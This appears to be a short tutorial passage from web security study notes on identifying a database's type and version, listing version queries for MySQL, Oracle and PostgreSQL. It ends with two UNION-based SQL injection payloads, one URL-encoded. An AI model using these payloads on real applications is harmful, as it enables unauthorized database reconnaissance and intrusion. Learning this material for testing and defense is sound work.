### Querying the database type and version.

Depending on the database type, we can use their SQL commands to determine the type and version of the database software. 
Some of the commands to determine the database version include:
1. MySQL
```sql
SELECT @@version
```
2. Oracle
```sql
SELECT * FROM v$version
```
3. PostgreSQL
```sql
SELECT version()
```

We can try this attack by performig a `UNION` attack by using the following payload
```sql
' UNION SELECT @@version--
```

```sql
'+UNION+SELECT+*+FROM+v%24version--
```